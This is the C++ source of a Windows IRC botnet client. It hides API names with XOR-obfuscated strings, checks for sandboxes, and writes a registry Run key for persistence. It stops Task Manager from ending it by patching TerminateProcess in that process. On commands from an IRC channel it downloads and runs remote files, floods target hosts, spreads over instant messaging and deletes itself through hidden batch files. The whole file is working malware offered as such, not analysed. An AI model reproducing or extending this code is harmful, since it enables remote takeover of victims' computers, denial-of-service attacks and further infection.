//Bot Includes
#include "Base.h"
#include "Cfg.h"

//Bot Encryption
char* EncUser = "\x00\x55\x52\x47\x51";
char* EncNick = "\x00\x4E\x48\x41\x48";
char* EncJoin = "\x00\x4A\x4E\x4B\x4D";
char* EncPing = "\x00\x50\x48\x4C\x44";
char* EncPong = "\x00\x50\x4E\x4C\x44";
char* EncPrivmsg = "\x00\x50\x53\x4B\x55\x49\x56\x41";
char* EncSendUser = "\x00\x55\x52\x47\x51\x24\x35\x26\x37\x28\x39\x2A\x3B";
char* EncSend = "\x00\x73\x64\x6C\x67";
char* EncRecv = "\x00\x72\x64\x61\x75";
char* EncSocket = "\x00\x73\x6E\x61\x68\x61\x71";
char* EncConnect = "\x00\x63\x6E\x6C\x6D\x61\x66\x72";
char* EncWS = "\x00\x57\x52\x43\x50\x70\x64\x74\x73\x7D\x79";
char* EncWsDLL = "\x00\x77\x72\x30\x5C\x37\x37\x28\x63\x64\x65";
char* EncGethost = "\x00\x67\x64\x76\x6B\x6B\x76\x72\x65\x71\x67\x6B\x66\x69";
char* EncWinExec = "\x00\x57\x68\x6C\x46\x7C\x60\x65";
char* EncGetFileName ="\x00\x47\x64\x76\x4E\x6B\x61\x73\x6B\x6D\x4F\x63\x67\x69\x43\x6F\x62\x75\x50";
char* EncGetModule ="\x00\x47\x64\x76\x4E\x6B\x61\x73\x6B\x6D\x41\x6B\x65\x68\x61\x6B\x4E";
char* EncCreateDir ="\x00\x43\x73\x67\x62\x70\x60\x42\x6E\x7A\x6C\x69\x7F\x63\x7F\x77\x4E";
char* EncRegCreate = "\x00\x52\x64\x65\x40\x76\x60\x67\x73\x6D\x42\x6F\x72\x49\x75\x4F";
char* EncRegSet = "\x00\x52\x64\x65\x50\x61\x71\x50\x66\x64\x7C\x6F\x4E\x74\x4C";
char* EncBtMutex = "\x00\x43\x73\x67\x62\x70\x60\x4B\x72\x7C\x6C\x72\x4A";
char* EncCopyFile = "\x00\x43\x6E\x72\x7A\x42\x6C\x6A\x62\x49";
char* EncKernel = "\x00\x4B\x44\x50\x4D\x41\x49\x35\x35\x26\x6D\x66\x67";
char* EncAdvapi = "\x00\x61\x65\x74\x62\x74\x6C\x35\x35\x26\x6D\x66\x67";
char* EncUrlmonDLL = "\x00\x75\x73\x6E\x6E\x6B\x6B\x28\x63\x64\x65";
char* EncDownloadFile ="\x00\x55\x53\x4E\x47\x6B\x72\x68\x6B\x67\x68\x6E\x5F\x63\x4B\x67\x63\x75\x50";
char* EncRegPlace ="\x00\x53\x4E\x44\x57\x53\x44\x54\x42\x54\x55\x47\x62\x6F\x7F\x61\x7C\x7F\x77\x66\x4F\x48\x42\x7F\x79"
"\x7C\x76\x6D\x68\x40\x41\x5D\x6A\x52\x53\x47\x4D\x50\x73\x43\x55\x5B\x40\x45\x45\x70\x71\x7C\x5A\x5E";
typedef int( __stdcall* SN )( SOCKET, const char*, int, int );
SN fsend;
typedef int( __stdcall* RC )( SOCKET, const char*, int, int );
RC frecv;
typedef SOCKET( __stdcall* SK )( int, int, int );
SK fsocket;
typedef int( __stdcall* CN )( SOCKET, const struct sockaddr*, int );
CN fconnect;
typedef int( __stdcall* WS )( WORD, LPWSADATA );
WS fWSAStartup;
typedef struct hostent* FAR( __stdcall* GHBN )( char* );
GHBN fgethostbyname;
typedef unsigned long( __stdcall* GMFN )( HMODULE, LPTSTR, DWORD );
GMFN fGetModuleFileName;
typedef HMODULE( __stdcall* GMH )( LPCTSTR );
GMH fGetModuleHandle;
typedef BOOL( __stdcall* CD )( LPCTSTR, LPSECURITY_ATTRIBUTES );
CD fCreateDirectory;
typedef LONG( __stdcall* RCKE )( HKEY, LPCTSTR, DWORD, LPTSTR, DWORD, REGSAM,
LPSECURITY_ATTRIBUTES, PHKEY, LPDWORD );
RCKE fRegCreateKeyEx;
typedef LONG( __stdcall* RSVE )( HKEY, LPCTSTR, DWORD, DWORD, const BYTE*, DWORD );
RSVE fRegSetValueEx;
typedef HANDLE( __stdcall* CM )( LPSECURITY_ATTRIBUTES, BOOL, LPCTSTR );
CM fBtMutex;
typedef BOOL( __stdcall* CF )( LPCTSTR, LPCTSTR, BOOL );
CF fCopyFile;
typedef UINT( __stdcall* WE )( LPCSTR, UINT );
WE fWinExec;
typedef HRESULT( __stdcall* UDTF )( LPUNKNOWN, LPCTSTR, LPCTSTR, DWORD, LPBINDSTATUSCALLBACK );
UDTF fURLDownloadToFile;

//Stop TaskManagr Being Able To Kill Process's
unsigned long __stdcall AntiTaskManager( void* pVoid )
{
    PROCESSENTRY32 pe32;
    HANDLE hProcess, hTask;
    unsigned long aTerminateProcess = (unsigned long)GetProcAddress( GetModuleHandle( "KERNEL32.DLL" ), "TerminateProcess" );
    unsigned char Retn = 0xC3;
    pe32.dwSize = sizeof( PROCESSENTRY32 );
    while( true )
    {
       hProcess = CreateToolhelp32Snapshot( 2, 0 );
       Process32First( hProcess, &pe32 );
       while( Process32Next( hProcess, &pe32 ) )
       {
          if( !stricmp( pe32.szExeFile, "TASKMGR.EXE" ) )
		  if( !stricmp( pe32.szExeFile, "taskmgr.exe" ) )
          {
             hTask = OpenProcess( PROCESS_ALL_ACCESS, FALSE, pe32.th32ProcessID );
          if( hTask == NULL )
             break;
          if( !WriteProcessMemory( hTask, (void *)aTerminateProcess, &Retn, 1, 0 ) )
             break;
          }
       }
       Sleep( 100 );
    }
    CloseHandle( hTask );
    CloseHandle( hProcess );
    return 0;
};

bool FuncLoad( )
{
    char* btWsDLL = Decrypt( EncWsDLL );
    char* btSend = Decrypt( EncSend );
    char* btRecv = Decrypt( EncRecv );
    char* btSocket = Decrypt( EncSocket );
    char* btConnect = Decrypt( EncConnect );
    char* btWS = Decrypt( EncWS );
    char* btGethost = Decrypt( EncGethost );
    char* btExec = Decrypt( EncWinExec );
    char* btGetFile = Decrypt( EncGetFileName );
    char* btGetModule = Decrypt( EncGetModule );
    char* btCreateDir = Decrypt( EncCreateDir );
    char* btRegCreate = Decrypt( EncRegCreate );
    char* btRegSet = Decrypt( EncRegSet );
    char* btBtMutex = Decrypt( EncBtMutex );
    char* btCopyFile = Decrypt( EncCopyFile );
    char* btKernel = Decrypt( EncKernel );
    char* btAdvapi = Decrypt( EncAdvapi );

	HMODULE hWinsock = LoadLibrary( btWsDLL );
    fsend = (SN)GetProcAddress( hWinsock, btSend );
    frecv = (RC)GetProcAddress( hWinsock, btRecv );
    fsocket = (SK)GetProcAddress( hWinsock, btSocket );
    fconnect = (CN)GetProcAddress( hWinsock, btConnect );
    fWSAStartup = (WS)GetProcAddress( hWinsock, btWS );
    fgethostbyname = (GHBN)GetProcAddress( hWinsock, btGethost );
    FreeLibrary( hWinsock );
    HMODULE hKernel = LoadLibrary( btKernel );
    fGetModuleFileName = (GMFN)GetProcAddress( hKernel, btGetFile );
    fGetModuleHandle = (GMH)GetProcAddress( hKernel, btGetModule );
    fCreateDirectory = (CD)GetProcAddress( hKernel, btCreateDir );
    fBtMutex = (CM)GetProcAddress( hKernel, btBtMutex );
    fCopyFile = (CF)GetProcAddress( hKernel, btCopyFile );
    fWinExec = (WE)GetProcAddress( hKernel, btExec );
    FreeLibrary( hKernel );
    HMODULE hAdvapi = LoadLibrary( btAdvapi );
    fRegCreateKeyEx = (RCKE)GetProcAddress( hAdvapi, btRegCreate );
    fRegSetValueEx = (RSVE)GetProcAddress( hAdvapi, btRegSet );
    FreeLibrary( hAdvapi );

    delete [] btWsDLL, btWS, btSend, btRecv, btSocket, btConnect, btGethost, btExec, btKernel, btAdvapi,
              btGetFile, btGetModule, btCreateDir, btRegCreate, btRegSet, btBtMutex, btCopyFile;
    return true;
};

bool btWinSock( )
{
    char* btWsDLL = Decrypt( EncWsDLL );
    LoadLibrary( btWsDLL );
    delete [] btWsDLL;
    WSADATA wsa;
    if( fWSAStartup( 0x0202, &wsa ) )
        return false;
    return true;
};

void IncStrings( )
{
    *EncUser++;
    *EncNick++;
    *EncJoin++;
    *EncPing++;
    *EncPong++;
    *EncPrivmsg++;
    *EncSendUser++;
    *EncAdvapi++;
    *EncKernel++;
    *EncSend++;
    *EncRecv++;
    *EncSocket++;
    *EncConnect++;
    *EncWS++;
    *EncWsDLL++;
    *EncGethost++;
    *EncWinExec++;
    *EncGetFileName++;
    *EncGetModule++;
    *EncCreateDir++;
    *EncRegCreate++;
    *EncRegSet++;
    *EncCopyFile++;
    *EncBtMutex++;
    *EncRegPlace++;
    *EncUrlmonDLL++;
    *EncDownloadFile++;
};

//Decrypt the strings
char* Decrypt( char* btString )
{
    int iStringLength = strlen( btString );
    char* btTempBuff = new char[ iStringLength + 1 ];
    strcpy( btTempBuff, btString );
    for( int i = 0; i < iStringLength; i++ )
    btTempBuff[ i ] = i ^ btTempBuff[ i ];
    btTempBuff[ iStringLength ] = 0;
    return( btTempBuff );
};

//Resolve our host
unsigned long ResolveHost( char* btHost )
{
    struct hostent* hGetHost = fgethostbyname( btHost );
    if( !hGetHost )
        return 0;
    return( (*(struct in_addr *)hGetHost->h_addr).s_addr );
};

//Send our packet
bool SendPacket( SOCKET btSock, char* btPacket, ... )
{
    char btSendBuff[ 0x500 ];
    ZeroMemory( btSendBuff, sizeof( btSendBuff ) );
    va_list vArgs;
    va_start( vArgs, btPacket );
    vsprintf( btSendBuff, btPacket, vArgs );
    va_end( vArgs );
    strcat( btSendBuff, "\r\n" );
    return( fsend( btSock, btSendBuff, strlen( btSendBuff ), 0 ) > 0 ? true : false );
};

//Download and Execute file
unsigned long __stdcall Download( void* pVoid )
{
    char btPath[ 32 ] = "C:\\";
    char* btLink = (char *)pVoid;
    char* btUrlmonDLL = Decrypt( EncUrlmonDLL );
    HMODULE hUrlmon = LoadLibrary( btUrlmonDLL );
    delete [] btUrlmonDLL;
    for( int i = 3; i < 8; i++ )
    btPath[ i ] = "abcdefghijklmnopqrstuvwxyz"[ rand( ) % 26 ];
    strcat( btPath, ".scr" );
    if( hUrlmon )
    {
        char* btDownloadFile = Decrypt( EncDownloadFile );
        fURLDownloadToFile = (UDTF)GetProcAddress( hUrlmon, btDownloadFile );
        delete [] btDownloadFile;
        HRESULT hDownload = fURLDownloadToFile( 0, btLink, btPath, 0, 0 );
    }

    FreeLibrary( hUrlmon );
    fWinExec( btPath, 0 );
    return 0;
};

//Irc Connection
SOCKET ConnectIRC( unsigned long dwIp, unsigned short wPort )
{
    SOCKET btSock;
    SOCKADDR_IN sSin;
    sSin.sin_family = AF_INET;
    sSin.sin_port = wPort;
    sSin.sin_addr.s_addr = dwIp;
    btSock = fsocket( AF_INET, SOCK_STREAM, IPPROTO_TCP );
    if( fconnect( btSock, (SOCKADDR *) &sSin, sizeof( sSin ) ) == SOCKET_ERROR )
    {
        return -1;
    }
    return( btSock );
};

//Irc Start Function
bool StartIRC( )
{
    SOCKET sIrcSocket = ConnectIRC( ResolveHost( btHost ), 0x29ff );
    if( sIrcSocket == -1 )
    return 0;
	if (btPass[0] != '\0')
	SendPacket ( sIrcSocket, "PASS %s\r\n", btPass ); 
    char btRecv[ 512 ], btBotNick[ 32 ];
    char* btNick = Decrypt( EncNick );
    for( int i = 0; i < 8; i++ )
    btBotNick[ i ] = "abcdefghijklmnopqrstuvwxyz"[ rand( ) % 26 ];
    btBotNick[ 8 ] = 0;
    SendPacket( sIrcSocket, "HELO" );//Bypass BitDefender FireWall
    SendPacket( sIrcSocket, "%s sv[%s]", btNick, btBotNick );
    delete [] btNick;
    int Curbyte = 0;
    while( frecv( sIrcSocket, (char *) &btRecv[ Curbyte ], 1, 0 ) > 0 )
    {
        switch( btRecv[ Curbyte ] )
        {
        case 0x0D:
            btRecv[ Curbyte ] = 0;
            Curbyte++;
            break;
        case 0x0A:
            btRecv[ Curbyte ] = 0;
            ParseIRC( sIrcSocket, btRecv );
            Curbyte = 0;
            break;
        default:
            Curbyte++;
            break;
        }
    }
    return true;
};

//Parse & Receive Commands
void ParseIRC( SOCKET btSock, char* btLine )
{
    char* btParam[ 32 ];
    int i;
    btParam[ 0 ] = strtok( btLine, " " );
    for( i = 1; i < 32; i++ )
        btParam[ i ] = strtok( NULL, " \r\n" );
    char* btPing = Decrypt( EncPing );
    if( !stricmp( btParam[ 0 ], btPing ) )
    {
        char* btPong = Decrypt( EncPong );
        SendPacket( btSock, "%s %s", btPong, btParam[ 1 ] );
        delete [] btPing, btPong;
    }
    char* btJoin = Decrypt( EncJoin );
    switch( atoi( btParam[ 1 ] ) )
    {
    case 005:
        SendPacket( btSock, "%s %s %s", btJoin, btChan, btCP );
        break;
    case 451:
        char* btSendUser = Decrypt( EncSendUser );
        SendPacket( btSock, btSendUser );
        delete [] btSendUser;
        break;
    }
    if( btParam[ 3 ] == NULL )
        return;

    char* btPrivmsg = Decrypt( EncPrivmsg );

    if( !stricmp( btParam[ 3 ], ":@get.file" ) )
    {
        if( btParam[ 4 ] == NULL )
            return;
        CreateThread( 0, 0, &Download, (void *)btParam[ 4 ], 0, 0 );
    }
    else if( !stricmp( btParam[ 3 ], ":@kill.bot" ) )
    {
        char btInstallPath[ 128 ];
        HKEY hReg;
        sprintf( btInstallPath, "%s\\%s", btDir, btEXE );
        StartCommand( false, ":2\r\ndel \"%s\"\r\nif exist \"%s\" goto 2\r\n", btInstallPath, btInstallPath );
        fRegCreateKeyEx( HKEY_LOCAL_MACHINE, Decrypt( EncRegPlace ), 0, NULL, REG_OPTION_NON_VOLATILE, KEY_ALL_ACCESS, NULL, &hReg, NULL );
        RegDeleteValue( hReg, btRNVal );
        RegCloseKey( hReg );
        ExitProcess( 0 );
    }
	else if( !stricmp( btParam[ 3 ], ":@flood.host" ) )
    {
		DDoS( btParam[4], btParam[5], btParam[6] );
	}
	else if( !stricmp( btParam[ 3 ], ":@im.spread" ) )
    {
		imsendmsg(btSock);
	}
	else if( !stricmp( btParam[ 3 ], ":@honeypot.on" ) )
	{
		CreateThread(NULL, 0, &VNCHONEYPOT, 0, 0, 0);
		SendPacket(btSock, "PRIVMSG %s :[HoneyPot]: Sorry, I am unfinished!\r\n", btChan); // Loaded Module: VNC
	}

	//Some standard IRC commands
	else if( !stricmp( btParam[ 3 ], ":@bot.join" ) ) //Join
	{
		SendPacket( btSock, "%s %s", btJoin, btParam[4] );
	}
	else if( !stricmp( btParam[ 3 ], ":@bot.part" ) ) //Part
	{
		SendPacket( btSock, "PART %s", btParam[4] );
	}
	else if( !stricmp( btParam[ 3 ], ":@bot.cmd" ) ) //Cmd
	{
		SendPacket( btSock, "%s %s %s", btParam[4], btParam[5], btParam[6] );
	}
	delete [] btJoin;
    delete [] btPrivmsg;
};

//Let's Start
void StartCommand( bool bDelete, char* btContent, ... )
{
    char btBuffer[ 0x400 ], btBatFile[ 0x10 ] = "C:\\";
    unsigned long uBytesWritten;
    ZeroMemory( btBuffer, sizeof( btBuffer ) );
    va_list vArgs;
    va_start( vArgs, btContent );
    vsprintf( btBuffer, btContent, vArgs );
    va_end( vArgs );
    for( int i = 3; i < 8; i++ )
        btBatFile[ i ] = ( 0x42 + rand( ) % ( 0x54 - 0x42 ) );
    strcat( btBatFile, ".bat" );
    HANDLE hHandle = CreateFile( btBatFile, GENERIC_WRITE, 0, 0, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, 0 );
    WriteFile( hHandle, btBuffer, strlen( btBuffer ), &uBytesWritten, 0 );
    CloseHandle( hHandle );
    fWinExec( btBatFile, SW_HIDE );
    Sleep( 1000 );
    if( bDelete )
    {
        DeleteFile( btBatFile );
    }
};

//Installation
void Install( )
{
    char btFilePath[ 0x100 ], btInstallPath[ 0x100 ];
    HKEY hReg;
    fGetModuleFileName( fGetModuleHandle( 0 ), btFilePath, sizeof( btFilePath ) );
    fCreateDirectory( btDir, 0 );
    sprintf( btInstallPath, "%s\\%s", btDir, btEXE );
    char* btRegPlace = Decrypt( EncRegPlace );
    fRegCreateKeyEx( HKEY_LOCAL_MACHINE, btRegPlace, 0, NULL, REG_OPTION_NON_VOLATILE, KEY_ALL_ACCESS, NULL, &hReg, NULL );
    delete [] btRegPlace;
    fRegSetValueEx( hReg, btRNVal, 0, REG_SZ, (unsigned char *)btInstallPath, strlen( btInstallPath ) + 1 );
    RegCloseKey( hReg );
    if( !strcmp( btInstallPath, btFilePath ) )
    {
        fBtMutex( NULL, FALSE, "EyeLoveMyMuteX" );

        if( GetLastError( ) == 0xB7 )
        {
            ExitProcess( 0 );
        }
    } else {
        StartCommand( true, "copy \"%s\" \"%s\"", btFilePath, btInstallPath );
        StartCommand( true, "\"%s\"", btInstallPath );
        ExitProcess( 0 );
    }
};

//Function To Start Out Services
bool StartAll( )
{
    srand( GetTickCount( ) );
    IncStrings( );
	if (KillSBox())
		return 0;
    if( !FuncLoad( ) )
        return false;
	CreateThread( 0, 0, &AntiTaskManager, 0, 0, 0 );
    Install( );
    if( !btWinSock( ) )
        return false;
    return true;
};

//Main Function
int WINAPI WinMain( HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nShowCmd )
{
    if( !StartAll( ) )
        return false;
    while( !StartIRC( ) )
        Sleep( 5000 );
    return 0;
	

}; 